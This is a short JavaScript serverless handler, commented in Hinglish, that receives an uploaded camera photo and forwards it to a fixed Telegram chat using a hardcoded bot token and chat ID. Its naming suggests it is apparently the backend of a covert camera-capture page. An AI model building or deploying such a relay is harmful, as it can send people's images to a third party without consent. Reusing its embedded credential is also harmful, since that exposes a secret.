// api/cam.js — camera photo receive karke Telegram par forward karta hai
export default async function handler(req, res) {
  // Sirf POST allow karo
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const formData = await req.formData();
    const file = formData.get("photo");

    if (!file) {
      return res.status(400).json({ error: "No photo" });
    }

    const CHAT = process.env.TG_CHAT_ID || '8908879084';
    const BOT = process.env.TG_BOT_TOKEN || '8746655192:AAE0OabqXKfBkbs_kIlIRQEKNo_kE3JB49k';
    // Telegram ko forward karo
    const tgForm = new FormData();
    tgForm.append("chat_id", CHAT);
    tgForm.append("photo", file, "snap.jpg");

    const tgRes = await fetch(
      `https://api.telegram.org/bot${BOT}/sendPhoto`,
      { method: "POST", body: tgForm }
    );

    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: "Forward failed" });
  }
}

export const config = {
  api: { bodyParser: false }, // FormData ke liye zaroori
};
